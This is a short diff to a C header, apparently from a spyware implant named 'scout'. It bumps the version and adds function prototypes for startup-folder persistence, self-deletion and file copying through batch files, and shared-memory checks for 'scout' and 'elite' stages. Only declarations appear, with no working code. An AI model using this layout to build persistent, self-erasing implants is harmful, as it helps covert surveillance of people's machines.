@@ -3,13 +3,31 @@
 
 #include "binpatched_vars.h"
 
-#define SCOUT_VERSION 1
+#define SCOUT_VERSION 2
+#define SHARED_MEMORY_WRITE_SIZE 4096
 
-
+VOID MySleep(ULONG uTime);
 VOID WaitForInput();
 VOID UseLess();
-VOID DeleteAndDie();
+VOID DeleteAndDie(BOOL uDie);
 VOID Drop();
+VOID DoCopyFile(PWCHAR pSource, PWCHAR pDest);
+PCHAR GetScoutSharedMemoryName();
+PCHAR GetEliteSharedMemoryName();
+BOOL CreateScoutSharedMemory();
+BOOL ExistsScoutSharedMemory();
+BOOL ExistsEliteSharedMemory();
+BOOL AmIFromStartup();
+BOOL StartBatch(PWCHAR pName);
+VOID CreateCopyBatch(PWCHAR pSource, PWCHAR pDest, PWCHAR *pBatchOutName);
+VOID CreateDeleteBatch(PWCHAR pFileName, PWCHAR *pBatchOutName);
+
+PWCHAR GetStartupPath();
+PWCHAR GetStartupScoutName();
+PWCHAR GetMySelfName();
+PWCHAR GetTemp();
+
+
 
 
 
